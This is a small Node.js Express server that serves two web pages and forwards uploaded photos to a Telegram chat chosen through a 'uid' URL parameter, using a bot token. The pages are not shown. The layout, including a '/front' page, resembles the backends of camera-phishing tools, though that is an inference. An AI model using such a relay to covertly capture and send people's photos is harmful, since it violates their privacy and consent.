require("dotenv").config();
const express = require("express");
const multer = require("multer");
const path = require("path");
const fetch = require("node-fetch");
const FormData = require("form-data");

const app = express();
const upload = multer();

app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.get("/front", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "front.html"));
});

app.post("/upload", upload.single("photo"), async (req, res) => {
  const uid = req.query.uid || "0000";
  const photo = req.file;

  if (!photo) {
    return res.status(400).send("Aucune photo reçue");
  }

  const form = new FormData();
  form.append("chat_id", uid);
  form.append("photo", photo.buffer, {
    filename: photo.originalname,
    contentType: photo.mimetype,
  });

  try {
    await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form,
    });
    res.sendStatus(200);
  } catch (err) {
    console.error("Erreur Telegram:", err);
    res.sendStatus(500);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Serveur lancé sur le port ${PORT}`));
